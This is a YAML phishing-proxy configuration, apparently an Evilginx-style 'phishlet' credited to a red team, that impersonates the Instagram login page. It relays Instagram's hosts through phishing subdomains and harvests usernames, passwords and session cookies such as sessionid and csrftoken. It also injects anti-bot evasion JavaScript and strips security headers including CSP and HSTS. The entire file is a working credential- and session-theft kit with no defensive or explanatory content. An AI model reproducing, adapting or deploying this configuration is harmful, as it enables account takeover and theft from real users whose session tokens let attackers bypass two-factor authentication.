name: "Instagram-Login"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - {phish_sub: "instagram", orig_sub: "www", domain: "instagram.com", session: true, is_landing: true}
  - {phish_sub: "api", orig_sub: "i", domain: "instagram.com", session: true, is_landing: false}
  - {phish_sub: "graph", orig_sub: "graph", domain: "instagram.com", session: true, is_landing: false}
  - {phish_sub: "static", orig_sub: "static", domain: "cdninstagram.com", session: false, is_landing: false}
auth_urls: ["/accounts/login", "/api/v1/accounts/login/ajax/"]
landing_path: ["/accounts/login"]
auth_tokens:
  - {type: "cookie", name: "sessionid"}
  - {type: "cookie", name: "csrftoken"}
  - {type: "cookie", name: "ds_user_id"}
  - {type: "cookie", name: "rur"}
  - {type: "cookie", name: "mid"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "enc_password", regex: null}
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
  - trigger_path: "/accounts/login"
    position: "body_end"
    content: |
      (function(){
        // Anti-Bot Evasion
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        document.addEventListener('contextmenu', event => event.preventDefault());
      })();
sub_filters:
  - {triggers_on: "www.instagram.com", orig_sub: "www", domain: "instagram.com", search: "https://www.instagram.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.instagram.com", orig_sub: "static", domain: "cdninstagram.com", search: "https://static.cdninstagram.com/", replace: "https://{hostname}/_igstatic/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "www.instagram.com", orig_sub: "i", domain: "instagram.com", search: "https://i.instagram.com/", replace: "https://{hostname}/_igapi/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.instagram.com", orig_sub: "graph", domain: "instagram.com", search: "https://graph.instagram.com/", replace: "https://{hostname}/_iggraph/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "static.cdninstagram.com", orig_sub: "static", domain: "cdninstagram.com", search: "https://static.cdninstagram.com/", replace: "https://{hostname}/_igstatic/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "i.instagram.com", orig_sub: "i", domain: "instagram.com", search: "https://i.instagram.com/", replace: "https://{hostname}/_igapi/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "graph.instagram.com", orig_sub: "graph", domain: "instagram.com", search: "https://graph.instagram.com/", replace: "https://{hostname}/_iggraph/", mimes: ["text/html", "application/json", "application/javascript"]}
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "Strict-Transport-Security"}
path_rewrites:
  - {pattern: "^/$", replace: "/accounts/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/gtm/|/logging", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/api/v1/accounts/login/ajax/"}
bridges:
  - {prefix: "/_igapi/", target_host: "i.instagram.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_iggraph/", target_host: "graph.instagram.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_igstatic/", target_host: "static.cdninstagram.com", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
  headers: ["*"]
